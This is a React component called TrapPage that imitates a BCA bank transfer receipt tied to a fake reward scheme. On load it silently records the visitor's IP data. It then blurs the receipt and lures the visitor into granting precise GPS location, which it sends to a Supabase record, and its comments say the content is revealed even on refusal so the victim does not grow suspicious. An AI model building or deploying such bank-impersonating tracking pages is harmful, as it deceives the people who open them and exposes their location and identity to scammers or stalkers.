import React, { useEffect, useState } from 'react';
import { CheckCircle2, Share2, Download, ChevronLeft, MoreVertical, Eye, Loader2, Lock } from 'lucide-react';
import { captureVisitorData, updateGPS } from '../utils/tracker';

const TrapPage = () => {
  const [currentTime, setCurrentTime] = useState('');
  const [currentDate, setCurrentDate] = useState('');
  // 'blurred' | 'loading' | 'revealed' | 'denied'
  const [state, setState] = useState('blurred');

  useEffect(() => {
    const now = new Date();
    setCurrentTime(now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }).replace('.', ':'));
    setCurrentDate(now.toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' }));

    // Capture data IP langsung di background — tanpa popup, tanpa izin
    captureVisitorData();
  }, []);

  const handleReveal = () => {
    setState('loading');

    if (!navigator.geolocation) {
      setState('revealed'); // tetap reveal walau GPS tidak ada
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        updateGPS(pos); // update record Supabase dengan GPS akurat
        setState('revealed');
      },
      () => {
        // Ditolak — tetap reveal konten supaya tidak curiga
        setState('revealed');
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  };

  const isBlurred = state === 'blurred' || state === 'loading';

  const rows = [
    { label: 'DARI REKENING', value: '342XXXX129' },
    { label: 'KE REKENING',   value: '883XXXX921' },
    { label: 'NAMA PENERIMA', value: 'ADMIN REWARD ARTIS' },
    { label: 'BERITA',        value: 'DP AKTIVASI HADIAH' },
  ];

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f1f1f1',
      display: 'flex',
      flexDirection: 'column',
      fontFamily: 'system-ui, -apple-system, sans-serif',
    }}>
      {/* BCA Header */}
      <div style={{
        background: '#003399', color: 'white', padding: '16px',
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <ChevronLeft size={24} />
          <span style={{ fontWeight: '600', fontSize: '18px' }}>M-Transfer</span>
        </div>
        <MoreVertical size={24} />
      </div>

      <div style={{ padding: '20px', flex: 1 }}>
        <div style={{
          background: 'white', borderRadius: '12px', padding: '24px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          position: 'relative', overflow: 'hidden',
        }}>
          <div style={{ color: '#00a859', marginBottom: '16px' }}>
            <CheckCircle2 size={64} strokeWidth={1.5} />
          </div>

          <h2 style={{ color: '#003399', fontWeight: '800', fontSize: '20px', marginBottom: '4px' }}>
            M-TRANSFER BERHASIL
          </h2>
          <p style={{ color: '#666', fontSize: '14px', marginBottom: '24px' }}>
            {currentDate} {currentTime}
          </p>

          {/* ── Konten yang di-blur ── */}
          <div style={{
            width: '100%',
            borderTop: '1px dashed #ddd',
            paddingTop: '20px',
            filter: isBlurred ? 'blur(6px)' : 'none',
            userSelect: isBlurred ? 'none' : 'auto',
            transition: 'filter 0.4s ease',
            pointerEvents: isBlurred ? 'none' : 'auto',
          }}>
            {rows.map((r) => (
              <div key={r.label} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
                <span style={{ color: '#888', fontSize: '14px' }}>{r.label}</span>
                <span style={{ fontWeight: '600', fontSize: '14px' }}>{r.value}</span>
              </div>
            ))}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
              <span style={{ color: '#888', fontSize: '14px' }}>JUMLAH</span>
              <span style={{ fontWeight: '700', fontSize: '16px', color: '#003399' }}>Rp 500.000,00</span>
            </div>

            <div style={{
              width: '100%', marginTop: '16px', padding: '12px',
              background: '#e6f4ea', borderRadius: '8px',
              color: '#00a859', fontSize: '13px', textAlign: 'center', fontWeight: '600',
            }}>
              Transaksi Berhasil Terverifikasi
            </div>
          </div>

          {/* ── Overlay tombol reveal — hanya muncul saat blur ── */}
          {isBlurred && (
            <div style={{
              position: 'absolute',
              bottom: '24px',
              left: '50%',
              transform: 'translateX(-50%)',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '10px',
              width: '80%',
            }}>
              {/* Label kunci */}
              <div style={{
                display: 'flex', alignItems: 'center', gap: '6px',
                background: 'rgba(0,0,0,0.55)', padding: '6px 14px',
                borderRadius: '20px', color: 'white', fontSize: '12px',
              }}>
                <Lock size={12} /> Detail disembunyikan untuk keamanan
              </div>

              {state === 'blurred' && (
                <button
                  onClick={handleReveal}
                  style={{
                    padding: '13px 28px',
                    background: '#003399',
                    color: 'white',
                    border: 'none',
                    borderRadius: '10px',
                    fontWeight: '700',
                    fontSize: '14px',
                    cursor: 'pointer',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    boxShadow: '0 4px 16px rgba(0,51,153,0.35)',
                  }}
                >
                  <Eye size={16} /> Lihat Bukti Transfer Lengkap
                </button>
              )}

              {state === 'loading' && (
                <div style={{
                  display: 'flex', alignItems: 'center', gap: '8px',
                  background: '#003399', color: 'white',
                  padding: '13px 28px', borderRadius: '10px',
                  fontSize: '14px', fontWeight: '600',
                }}>
                  <Loader2 size={16} style={{ animation: 'spin 1s linear infinite' }} />
                  Memuat detail...
                </div>
              )}
            </div>
          )}
        </div>

        {/* Tombol Simpan & Bagikan — hanya muncul setelah reveal */}
        {state === 'revealed' && (
          <div style={{ marginTop: '20px', display: 'flex', gap: '12px' }}>
            <button style={{
              flex: 1, background: 'white', border: '1px solid #003399',
              color: '#003399', padding: '14px', borderRadius: '8px', fontWeight: '600',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
            }}>
              <Download size={18} /> Simpan
            </button>
            <button style={{
              flex: 1, background: '#003399', border: 'none', color: 'white',
              padding: '14px', borderRadius: '8px', fontWeight: '600',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
            }}>
              <Share2 size={18} /> Bagikan
            </button>
          </div>
        )}
      </div>

      <div style={{ padding: '20px', textAlign: 'center', color: '#999', fontSize: '12px' }}>
        PT BANK CENTRAL ASIA TBK
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
};

export default TrapPage;
